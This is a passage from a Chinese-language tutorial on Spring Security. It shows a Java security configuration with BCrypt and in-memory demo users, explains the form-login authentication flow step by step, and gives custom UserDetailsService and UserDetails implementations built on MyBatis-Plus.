class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bean 1: 定义一个密码编码器</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> PasswordEncoder <span class="title function_">passwordEncoder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 使用 BCrypt 强哈希函数进行加密</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BCryptPasswordEncoder</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bean 2: 定义用户信息服务 (UserDetailsService)</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> UserDetailsService <span class="title function_">userDetailsService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个基于内存的用户信息管理器</span></span><br><span class="line">        <span class="type">InMemoryUserDetailsManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryUserDetailsManager</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个用户，密码必须经过 passwordEncoder 加密</span></span><br><span class="line">        <span class="type">UserDetails</span> <span class="variable">user</span> <span class="operator">=</span> User.withUsername(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">                .password(passwordEncoder().encode(<span class="string">&quot;password&quot;</span>))</span><br><span class="line">                .roles(<span class="string">&quot;USER&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">        </span><br><span class="line">        <span class="type">UserDetails</span> <span class="variable">admin</span> <span class="operator">=</span> User.withUsername(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                .password(passwordEncoder().encode(<span class="string">&quot;password&quot;</span>))</span><br><span class="line">                .roles(<span class="string">&quot;ADMIN&quot;</span>, <span class="string">&quot;USER&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        manager.createUser(user);</span><br><span class="line">        manager.createUser(admin);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> manager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bean 3: 定义安全过滤器链 (SecurityFilterChain)</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">                .authorizeHttpRequests(authorize -&gt; authorize</span><br><span class="line">                        .requestMatchers(<span class="string">&quot;/dashboard&quot;</span>).hasRole(<span class="string">&quot;ADMIN&quot;</span>) <span class="comment">// /dashboard 只有 ADMIN 角色可以访问</span></span><br><span class="line">                        .requestMatchers(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;/login&quot;</span>).permitAll() <span class="comment">// 首页与登陆页允许所有用户访问</span></span><br><span class="line">                        .anyRequest().authenticated() <span class="comment">// 其他所有请求都需要认证</span></span><br><span class="line">                )</span><br><span class="line">            	<span class="comment">// 启用基于表单的登录认证功能</span></span><br><span class="line">                .formLogin(</span><br><span class="line">        			<span class="comment">// 下面这行的 permitAll 是让Spring Security知道</span></span><br><span class="line">                    <span class="comment">// formLogin() 这个机制本身是开放的，但它不会影响</span></span><br><span class="line">                    <span class="comment">// authorizeHttpRequests 对 /login URL 的访问控制。</span></span><br><span class="line">                    <span class="comment">// 这就是为什么你必须在 authorizeHttpRequests 中也进行配置。    	</span></span><br><span class="line">		            AbstractAuthenticationFilterConfigurer::permitAll</span><br><span class="line">                )</span><br><span class="line">                .logout(logout -&gt; logout</span><br><span class="line">                        .logoutSuccessUrl(<span class="string">&quot;/&quot;</span>) <span class="comment">// 注销成功后重定向到首页</span></span><br><span class="line">                );</span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>配置解读</strong>：</p>
<ol>
<li><strong><code>passwordEncoder()</code></strong>:<ul>
<li>我们声明了一个 <code>PasswordEncoder</code> 的 Bean。这是现代 Spring Security 强制要求的。</li>
<li>我们选择了 <code>BCryptPasswordEncoder</code>，这是一个非常安全和推荐的密码哈希算法。</li>
</ul>
</li>
<li><strong><code>userDetailsService()</code></strong>:<ul>
<li>我们定义了一个 <code>UserDetailsService</code> Bean 来告诉 Spring Security 如何获取用户信息。</li>
<li>这里我们使用了 <code>InMemoryUserDetailsManager</code>，它在内存中创建用户，非常适合演示和测试。</li>
<li><strong>关键点</strong>：<code>User.withUsername(...)</code> 构建用户时，<code>.password()</code> 方法接收的<strong>必须是经过加密后的密码</strong>。所以我们调用了 <code>passwordEncoder().encode(&quot;password&quot;)</code>。</li>
</ul>
</li>
<li><strong><code>filterChain(HttpSecurity http)</code></strong>:<ul>
<li>这是安全配置的核心。我们通过 <code>HttpSecurity</code> 对象来构建一个 <code>SecurityFilterChain</code>。</li>
<li><code>.authorizeHttpRequests(...)</code> 定义了<strong>授权规则</strong>：<ul>
<li><code>/dashboard</code> 路径需要 “ADMIN” 角色。</li>
<li><code>/</code> 根路径与<code>/login</code>登陆路径允许所有人访问 (<code>permitAll</code>)。</li>
<li>其他任何请求 (<code>anyRequest()</code>) 都必须经过认证 (<code>authenticated()</code>)。</li>
</ul>
</li>
<li><code>.formLogin(...)</code> 配置了表单登录。</li>
<li><code>.logout(...)</code> 配置了注销功能。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="第五步：再次测试"><a href="#第五步：再次测试" class="headerlink" title="第五步：再次测试"></a>第五步：再次测试</h4><ol>
<li><strong>重新启动应用</strong>。这次控制台不会再打印随机密码了。</li>
<li><strong>访问 <code>http://localhost:8080/dashboard</code></strong>。你依然会被重定向到登录页。</li>
<li><strong>使用 <code>user</code> &#x2F; <code>password</code> 登录</strong>。你会发现登录后看到一个 <strong>403 Forbidden</strong> 错误页面。这是因为我们配置了 <code>/dashboard</code> 需要 <code>ADMIN</code> 角色，而 <code>user</code> 用户只有 <code>USER</code> 角色。</li>
<li><strong>注销</strong>（可以直接访问 <code>/logout</code>），然后<strong>使用 <code>admin</code> &#x2F; <code>password</code> 登录</strong>。这次你就能成功访问 <code>/dashboard</code> 了。</li>
<li><strong>访问 <code>http://localhost:8080/</code></strong>。无论你是否登录，这个页面始终可以访问。</li>
</ol>
<hr>
<h2 id="2-认证（Authentication）"><a href="#2-认证（Authentication）" class="headerlink" title="2. 认证（Authentication）"></a>2. 认证（Authentication）</h2><h3 id="2-1-认证流程详解（重点）"><a href="#2-1-认证流程详解（重点）" class="headerlink" title="2.1 认证流程详解（重点）"></a>2.1 认证流程详解（重点）</h3><p>当用户在登录页面输入用户名和密码，点击“登录”按钮后，Spring Security 内部发生了一系列精妙的协作。我们将以最常见的<strong>基于表单的认证 (Form Login)</strong> 为例，一步步拆解这个流程。</p>
<h4 id="2-1-1-宏观流程图"><a href="#2-1-1-宏观流程图" class="headerlink" title="2.1.1 宏观流程图"></a>2.1.1 宏观流程图</h4><pre><code class="highlight mermaid">graph LR
    subgraph &quot;SecurityFilterChain&quot;
        A[...一系列其他过滤器...&lt;br&gt;CsrfFilter, CorsFilter等]
        B[认证过滤器&lt;br&gt;UsernamePassword&lt;br&gt;AuthenticationFilter]
        C[创建未认证的&lt;br&gt;Authentication对象]
        D[调用 AuthenticationManager]
        E[AuthenticationProvider&lt;br&gt;处理认证逻辑]
        F[调用 UserDetailsService&lt;br&gt;加载用户信息]
        G[PasswordEncoder&lt;br&gt;比对密码]
        H[返回已认证的&lt;br&gt;Authentication对象]
        I[存入 SecurityContextHolder&lt;br&gt;与当前线程绑定]
    end
    A--&gt;B
    B--&gt;C
    C--&gt;|传递token对象|D
    D--&gt;|遍历管理的Provider&lt;br&gt;查看是否支持此token|E
    E--&gt;F
    F--&gt;G
    G--&gt;H
    H--&gt;I</code></pre>



<hr>
<h4 id="2-1-2-详细步骤分解"><a href="#2-1-2-详细步骤分解" class="headerlink" title="2.1.2 详细步骤分解"></a>2.1.2 详细步骤分解</h4><h5 id="第-1-步-UsernamePasswordAuthenticationFilter-拦截请求"><a href="#第-1-步-UsernamePasswordAuthenticationFilter-拦截请求" class="headerlink" title="第 1 步: UsernamePasswordAuthenticationFilter 拦截请求"></a>第 1 步: <code>UsernamePasswordAuthenticationFilter</code> 拦截请求</h5><ul>
<li><strong>触发条件</strong>: 当一个 <code>POST</code> 请求发送到 <code>/login</code> (这是默认的登录URL，可以配置) 时，这个过滤器会被激活。</li>
<li><strong>核心工作</strong>:<ol>
<li><strong>判断是否为登录请求</strong>: 它会检查请求的 URL 和 HTTP 方法是否匹配它所配置的登录请求。</li>
<li><strong>提取凭证</strong>: 如果匹配，它会从 <code>HttpServletRequest</code> 的参数中提取用户名 (默认参数名 <code>username</code>) 和密码 (默认参数名 <code>password</code>)。</li>
<li><strong>封装 Token</strong>: 它将提取出的用户名和密码封装成一个 <code>UsernamePasswordAuthenticationToken</code> 对象。这是一个 <code>Authentication</code> 接口的实现类。<ul>
<li><strong>关键点</strong>: 此时创建的这个 Token 是 <strong>“未认证” (unauthenticated)</strong> 的。我们可以通过 <code>token.isAuthenticated()</code> 返回 <code>false</code> 来判断。它的 <code>authorities</code> 列表也是空的。</li>
</ul>
</li>
</ol>
</li>
</ul>
<hr>
<h5 id="第-2-步-调用-AuthenticationManager"><a href="#第-2-步-调用-AuthenticationManager" class="headerlink" title="第 2 步: 调用 AuthenticationManager"></a>第 2 步: 调用 <code>AuthenticationManager</code></h5><ul>
<li><code>UsernamePasswordAuthenticationFilter</code> 自身并不执行真正的认证逻辑。它遵循**“委托模式”**，将认证的重任交给了 <code>AuthenticationManager</code>。</li>
<li>它调用 <code>authenticationManager.authenticate(token)</code> 方法，将上一步创建的<strong>未认证 Token</strong> 传进去。</li>
</ul>
<hr>
<h5 id="第-3-步-第-4-步-AuthenticationManager-的实现-ProviderManager"><a href="#第-3-步-第-4-步-AuthenticationManager-的实现-ProviderManager" class="headerlink" title="第 3 步 &amp; 第 4 步: AuthenticationManager 的实现 ProviderManager"></a>第 3 步 &amp; 第 4 步: <code>AuthenticationManager</code> 的实现 <code>ProviderManager</code></h5><ul>
<li><code>AuthenticationManager</code> 是一个接口，它只有一个 <code>authenticate</code> 方法。</li>
<li>在 Spring Security 中，它最常用的实现类是 <code>ProviderManager</code>。</li>
<li><code>ProviderManager</code> 的作用像一个**“认证委托总管”**。它内部维护了一个 <code>AuthenticationProvider</code> 的列表。</li>
<li>当 <code>ProviderManager</code> 收到 <code>authenticate</code> 请求时，它会<strong>遍历</strong>自己管理的所有 <code>AuthenticationProvider</code>，并询问每一个 Provider：“你能处理这种类型的 <code>Authentication</code> Token 吗？” (通过调用 <code>provider.supports(token.getClass())</code>)。</li>
</ul>
<hr>
<h5 id="第-5-步-AuthenticationProvider-执行核心认证"><a href="#第-5-步-AuthenticationProvider-执行核心认证" class="headerlink" title="第 5 步: AuthenticationProvider 执行核心认证"></a>第 5 步: <code>AuthenticationProvider</code> 执行核心认证</h5><ul>
<li>如果某个 <code>AuthenticationProvider</code> (例如，处理用户名密码的 <code>DaoAuthenticationProvider</code>) 返回 <code>true</code>，表示它可以处理，<code>ProviderManager</code> 就会调用它的 <code>authenticate(token)</code> 方法。</li>
<li><strong><code>DaoAuthenticationProvider</code> 是核心中的核心，它的工作流程如下</strong>:<ol>
<li><strong>获取用户名</strong>: 从传入的<strong>未认证 Token</strong> 中获取用户名。</li>
<li><strong>加载用户信息 (第 6、7 步)</strong>: 调用它所配置的 <code>UserDetailsService</code> 的 <code>loadUserByUsername(username)</code> 方法，去数据库 (或其他数据源) 中查找用户。<ul>
<li>如果找不到用户，<code>UserDetailsService</code> 会抛出 <code>UsernameNotFoundException</code>，认证失败。</li>
<li>如果找到了，会返回一个包含了用户所有信息（包括<strong>加密后的密码</strong>和<strong>权限列表</strong>）的 <code>UserDetails</code> 对象。</li>
</ul>
</li>
<li><strong>密码校验 (第 8 步)</strong>: 调用它所配置的 <code>PasswordEncoder</code> 的 <code>matches(rawPassword, encodedPassword)</code> 方法。<ul>
<li><code>rawPassword</code>: 来自用户提交的、<strong>未认证 Token</strong> 中的明文密码。</li>
<li><code>encodedPassword</code>: 来自上一步从数据库加载的 <code>UserDetails</code> 对象中的<strong>加密密码</strong>。</li>
<li>如果 <code>matches</code> 返回 <code>false</code>，则抛出 <code>BadCredentialsException</code>，认证失败。</li>
</ul>
</li>
<li><strong>检查账户状态</strong>: 检查从 <code>UserDetails</code> 中获取的账户状态（如 <code>isAccountNonLocked()</code>, <code>isEnabled()</code> 等）。如果账户状态异常（如被锁定、已过期），则抛出相应的异常，认证失败。</li>
<li><strong>认证成功，构建新 Token (第 9 步)</strong>: 如果所有检查都通过，<code>DaoAuthenticationProvider</code> 会创建一个<strong>新的</strong> <code>UsernamePasswordAuthenticationToken</code>。<ul>
<li><strong>这个新的 Token 是“已认证” (authenticated) 的</strong>。</li>
<li>它的 <code>principal</code> 是从数据库加载的 <code>UserDetails</code> 对象。</li>
<li>它的 <code>credentials</code> (密码) 会被<strong>清空 (设置为 null)</strong>，防止敏感信息泄露。</li>
<li>它的 <code>authorities</code> 列表会用 <code>UserDetails</code> 中的权限信息来填充。</li>
<li>最后，它将这个<strong>已认证的 Token</strong> 返回给 <code>ProviderManager</code>。</li>
</ul>
</li>
</ol>
</li>
</ul>
<hr>
<h5 id="第-10-步-返回认证结果"><a href="#第-10-步-返回认证结果" class="headerlink" title="第 10 步: 返回认证结果"></a>第 10 步: 返回认证结果</h5><ul>
<li><code>ProviderManager</code> 接收到 <code>DaoAuthenticationProvider</code> 返回的<strong>已认证 Token</strong>，然后将其原路返回给最初的调用者——<code>UsernamePasswordAuthenticationFilter</code>。</li>
<li>如果在此过程中任何一个 <code>AuthenticationProvider</code> 抛出了 <code>AuthenticationException</code>（认证异常），<code>ProviderManager</code> 会捕获它，并最终将异常传递回 Filter。</li>
</ul>
<hr>
<h5 id="第-11-步-第-12-步-后续处理"><a href="#第-11-步-第-12-步-后续处理" class="headerlink" title="第 11 步 &amp; 第 12 步: 后续处理"></a>第 11 步 &amp; 第 12 步: 后续处理</h5><p><code>UsernamePasswordAuthenticationFilter</code> 接收到 <code>AuthenticationManager</code> 返回的结果后，会进行如下操作：</p>
<ul>
<li><strong>如果认证成功 (返回了已认证的 <code>Authentication</code> 对象)</strong>:<ol>
<li><strong>更新安全上下文</strong>: 调用 <code>SecurityContextHolder.getContext().setAuthentication(authenticatedToken)</code>，将这个<strong>已认证的 Token</strong> 放入 <code>SecurityContext</code> 中。至此，当前用户就在本次请求的后续处理以及未来的请求中（通过 Session）被认为是已登录状态了。</li>
<li><strong>触发成功处理器</strong>: 调用 <code>AuthenticationSuccessHandler</code>。默认的处理器会将用户重定向到他们访问的原始页面，或者是一个配置好的默认成功页面。</li>
<li><strong>(可选) 触发 Remember-Me</strong>: 如果配置了“记住我”功能，此时也会生成相应的 cookie。</li>
</ol>
</li>
<li><strong>如果认证失败 (抛出了 <code>AuthenticationException</code>)</strong>:<ol>
<li><strong>清空安全上下文</strong>: <code>SecurityContextHolder.clearContext()</code>，确保没有任何残留的认证信息。</li>
<li><strong>触发失败处理器</strong>: 调用 <code>AuthenticationFailureHandler</code>。默认的处理器会将用户重定向回登录页面，并附带一个错误参数（如 <code>/login?error</code>）。</li>
</ol>
</li>
</ul>
<hr>
<h3 id="2-2-UserDetailsService-自定义实现"><a href="#2-2-UserDetailsService-自定义实现" class="headerlink" title="2.2 UserDetailsService 自定义实现"></a>2.2 <code>UserDetailsService</code> 自定义实现</h3><p>在 <code>1.4 Hello Security</code> 示例中，我们使用了 <code>InMemoryUserDetailsManager</code> 来在内存中创建用户。这对于测试和快速原型开发非常方便，但在真实的应用中，用户信息几乎总是存储在数据库、LDAP或其他持久化存储中。</p>
<p><code>UserDetailsService</code> 接口就是 Spring Security 提供的、用于连接这些<strong>外部用户数据源</strong>的标准化桥梁。我们的任务就是提供一个该接口的实现类，告诉 Spring Security：“嘿，当需要用户信息时，调用我的这个类，我会去数据库里帮你查！”</p>
<h4 id="2-2-1-为什么需要自定义？"><a href="#2-2-1-为什么需要自定义？" class="headerlink" title="2.2.1 为什么需要自定义？"></a>2.2.1 为什么需要自定义？</h4><ul>
<li><strong>对接真实数据</strong>: 将 Spring Security 的认证机制与你的用户表（或其他用户存储）集成。</li>
<li><strong>灵活的用户模型</strong>: 你的用户实体（<code>User</code> Entity）可能包含很多业务字段（如昵称、邮箱、注册时间等），而 <code>UserDetails</code> 接口只关心安全相关的核心字段。自定义实现可以完成从你的实体到 <code>UserDetails</code> 的转换。</li>
<li><strong>复杂的权限模型</strong>: 你的权限可能存储在多个关联表中（用户-角色表，角色-权限表）。自定义实现可以在加载用户时，一并查询并组装这些复杂的权限信息。</li>
</ul>
<hr>
<h4 id="2-2-2-实现步骤-以-MP-为例"><a href="#2-2-2-实现步骤-以-MP-为例" class="headerlink" title="2.2.2 实现步骤 (以 MP 为例)"></a>2.2.2 实现步骤 (以 MP 为例)</h4><p>假设我们有一个基于 MybatisPlus 的项目，包含以下实体：</p>
<p><strong>1. 用户实体 (<code>User</code> Entity)</strong></p>
<p>这代表了我们数据库中的 <code>users</code> 表。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(&quot;users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@TableId</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>2. 用户DAO (<code>UserMapper</code>)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;User&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="3-创建-UserDetailsService-的实现类"><a href="#3-创建-UserDetailsService-的实现类" class="headerlink" title="3. 创建 UserDetailsService 的实现类"></a>3. 创建 <code>UserDetailsService</code> 的实现类</h5><p>这是最核心的一步。我们创建一个 Service 类，实现 <code>UserDetailsService</code> 接口。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyUserDetailsService</span> <span class="keyword">implements</span> <span class="title class_">UserDetailsService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> UserDetails <span class="title function_">loadUserByUsername</span><span class="params">(String username)</span> <span class="keyword">throws</span> UsernameNotFoundException &#123;</span><br><span class="line">        log.info(<span class="string">&quot;loadUserByUsername: &#123;&#125;&quot;</span>, username);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userMapper</span><br><span class="line">                .selectOne(<span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;User&gt;()</span><br><span class="line">                        .eq(User::getUsername, username));</span><br><span class="line">        Optional.ofNullable(user).orElseThrow(() -&gt; <span class="keyword">new</span> <span class="title class_">UsernameNotFoundException</span>(<span class="string">&quot;用户不存在&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">org</span>.springframework.security.core.userdetails.User(</span><br><span class="line">                user.getUsername(),</span><br><span class="line">                user.getPassword(),</span><br><span class="line">                <span class="literal">true</span>,   <span class="comment">// enabled</span></span><br><span class="line">                <span class="literal">true</span>, <span class="comment">// accountNonExpired</span></span><br><span class="line">                <span class="literal">true</span>, <span class="comment">// credentialsNonExpired</span></span><br><span class="line">                <span class="literal">true</span>, <span class="comment">// accountNonLocked</span></span><br><span class="line">                Collections.emptyList() <span class="comment">// 权限列表</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码解读</strong>:</p>
<ul>
<li><code>@Service</code>: 将 <code>MyUserDetailsService</code> 注册为一个 Spring Bean，这样 Spring Security 就能自动发现并使用它。</li>
<li><code>@RequiredArgsConstructor</code>: 注入我们之前创建的 <code>UserMapper</code>。</li>
<li><code>loadUserByUsername(String username)</code>: 这是接口要求我们必须实现的方法。<ol>
<li>我们调用 <code>userMapper.selectOne(new LambdaQueryWrapper&lt;User&gt;().eq(User::getUsername, username))</code>。</li>
<li>如果找不到用户 (<code>Optional</code> 为空)，<strong>必须</strong>抛出 <code>UsernameNotFoundException</code>。这是 Spring Security 的契约，它会捕获这个异常并将其转换为一个认证失败的消息。<strong>切勿返回 <code>null</code></strong>。</li>
<li>如果找到了用户，我们需要返回一个 <code>UserDetails</code> 接口的实例。这里我们使用了 <code>org.springframework.security.core.userdetails.User</code> 这个内置的实现类，它非常方便。我们把从数据库查出的用户名、<strong>已加密的密码</strong>、账户状态等信息填充进去。</li>
</ol>
</li>
</ul>
<hr>
<h4 id="2-2-3-进阶：加载角色和权限"><a href="#2-2-3-进阶：加载角色和权限" class="headerlink" title="2.2.3 进阶：加载角色和权限"></a>2.2.3 进阶：加载角色和权限</h4><p>通常，我们的权限模型会更复杂，比如用户有关联的角色。</p>
<h5 id="1-扩展实体"><a href="#1-扩展实体" class="headerlink" title="1. 扩展实体"></a>1. 扩展实体</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// User.java (添加角色关系)</span></span><br><span class="line"><span class="keyword">private</span> String role;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-更新-UserDetailsService"><a href="#2-更新-UserDetailsService" class="headerlink" title="2. 更新 UserDetailsService"></a>2. 更新 <code>UserDetailsService</code></h5><p>现在，我们需要在加载用户时，将用户的 <code>Role</code> 集合转换为 <code>GrantedAuthority</code> 集合。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyUserDetailsService</span> <span class="keyword">implements</span> <span class="title class_">UserDetailsService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> UserDetails <span class="title function_">loadUserByUsername</span><span class="params">(String username)</span> <span class="keyword">throws</span> UsernameNotFoundException &#123;</span><br><span class="line">        log.info(<span class="string">&quot;loadUserByUsername: &#123;&#125;&quot;</span>, username);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userMapper</span><br><span class="line">                .selectOne(<span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;User&gt;()</span><br><span class="line">                        .eq(User::getUsername, username));</span><br><span class="line">        Optional.ofNullable(user).orElseThrow(() -&gt; <span class="keyword">new</span> <span class="title class_">UsernameNotFoundException</span>(<span class="string">&quot;用户不存在&quot;</span>));</span><br><span class="line"></span><br><span class="line">        Collection&lt;? <span class="keyword">extends</span> <span class="title class_">GrantedAuthority</span>&gt; authorities = Collections.singleton(<span class="keyword">new</span> <span class="title class_">SimpleGrantedAuthority</span>(user.getRole()));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">org</span>.springframework.security.core.userdetails.User(</span><br><span class="line">                user.getUsername(),</span><br><span class="line">                user.getPassword(),</span><br><span class="line">                <span class="literal">true</span>,   <span class="comment">// enabled</span></span><br><span class="line">                <span class="literal">true</span>, <span class="comment">// accountNonExpired</span></span><br><span class="line">                <span class="literal">true</span>, <span class="comment">// credentialsNonExpired</span></span><br><span class="line">                <span class="literal">true</span>, <span class="comment">// accountNonLocked</span></span><br><span class="line">                authorities <span class="comment">// 权限列表</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码解读</strong>:</p>
<ul>
<li>我们从 <code>user</code> 对象中获取 <code>role</code> 。</li>
<li>创建一个只包含单个元素的不可变集合(<code>Collections.singleton</code>),将用户角色转换为 Spring Security 能识别的权限对象,放入不可变集合中。<code>SimpleGrantedAuthority</code> 是 <code>GrantedAuthority</code> 接口最常用的实现类，它接收一个代表权限的字符串（例如，<code>&quot;ROLE_ADMIN&quot;</code>）。</li>
</ul>
<hr>
<h4 id="2-2-4-自定义-UserDetails-实现类-可选，但推荐"><a href="#2-2-4-自定义-UserDetails-实现类-可选，但推荐" class="headerlink" title="2.2.4 自定义 UserDetails 实现类 (可选，但推荐)"></a>2.2.4 自定义 <code>UserDetails</code> 实现类 (可选，但推荐)</h4><p>直接使用 <code>org.springframework.security.core.userdetails.User</code> 很方便，但有时我们希望在 <code>UserDetails</code> 对象中携带更多自定义信息（比如用户ID、昵称），或者让我们的 <code>User</code> 实体本身就具备安全用户的能力。</p>
<p>创建一个独立的类实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyUserDetails</span> <span class="keyword">implements</span> <span class="title class_">UserDetails</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String role;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyUserDetails</span><span class="params">(Long id, String username, String password, String role)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">        